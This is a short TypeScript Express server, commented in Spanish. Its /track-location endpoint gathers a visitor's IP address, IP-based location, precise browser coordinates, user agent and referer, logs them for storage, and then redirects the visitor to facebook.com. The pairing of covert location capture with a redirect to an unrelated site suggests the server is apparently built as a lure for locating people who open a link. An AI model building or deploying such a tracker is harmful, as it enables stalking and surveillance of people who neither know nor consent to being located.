import * as express from "express";
import * as path from "path";
import * as requestIp from 'request-ip';
import * as geoip from "geoip-lite";

const app = express();
const port = parseInt(process.env.PORT) || parseInt(process.argv[3]) || 8080;

app.use(express.static(path.join(__dirname, '../public')))
   .set('views', path.join(__dirname, '../views'))  // Cambia la ruta si es necesario
   .set('view engine', 'ejs')
   .use(express.json());

// Renderizar la página principal
app.get('/', (req, res) => {
  res.render('index');  // Renderiza la vista `index.ejs`
});

// API simple para prueba
app.get('/api', (req, res) => {
  res.json({ "msg": "Hello world" });
});

// Ruta para recibir la geolocalización
app.post('/track-location', (req, res) => {
  const clientIp = requestIp.getClientIp(req);  // Obtiene la IP del cliente
  const geo = clientIp ? geoip.lookup(clientIp) : null;  // Busca la ubicación basada en la IP
  const { latitude, longitude } = req.body;  // Geolocalización precisa del cliente
  const userAgent = req.headers['user-agent'];  // Agente de usuario
  const referer = req.headers['referer'];  // Referer de la solicitud

  // Información que deseas guardar
  const deviceInfo = {
    ip: clientIp,
    location: geo,
    userAgent,
    referer,
    preciseLocation: {
      latitude,
      longitude,
    },
  };

  // Aquí puedes guardar `deviceInfo` en una base de datos
  console.log(deviceInfo);

  // Redirigir a una página específica
  res.json({ redirectUrl: 'https://facebook.com' });
});

// Iniciar el servidor
app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
